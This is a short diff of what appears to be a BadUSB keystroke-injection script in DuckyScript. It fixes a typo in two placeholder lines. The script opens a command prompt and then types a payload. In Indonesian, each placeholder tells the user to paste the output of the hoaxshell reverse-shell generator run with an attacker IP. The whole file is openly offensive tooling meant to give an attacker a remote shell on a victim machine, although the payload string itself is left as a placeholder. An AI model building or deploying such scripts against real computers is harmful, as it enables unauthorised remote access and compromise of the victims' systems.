@@ -9,11 +9,11 @@ STRING cmd
 DELAY 1000
 ENTER
 DELAY 1000
-STRING (Masukkan di sini hasil geneate dari hasil sudo python3 hoaxshell.py -s <ip attacker>, download hoaxshell : https://github.com/t3l3machus/hoaxshell)
+STRING (Masukkan di sini hasil generate dari hasil sudo python3 hoaxshell.py -s <ip attacker>, download hoaxshell : https://github.com/t3l3machus/hoaxshell)
 DELAY 2000
 ENTER
 DELAY 2000
-STRING (Masukkan di sini hasil geneate dari hasil sudo python3 hoaxshell.py -s <ip attacker>, download hoaxshell : https://github.com/t3l3machus/hoaxshell)
+STRING (Masukkan di sini hasil generate dari hasil sudo python3 hoaxshell.py -s <ip attacker>, download hoaxshell : https://github.com/t3l3machus/hoaxshell)
 DELAY 2000
 ENTER
 DELAY 3000
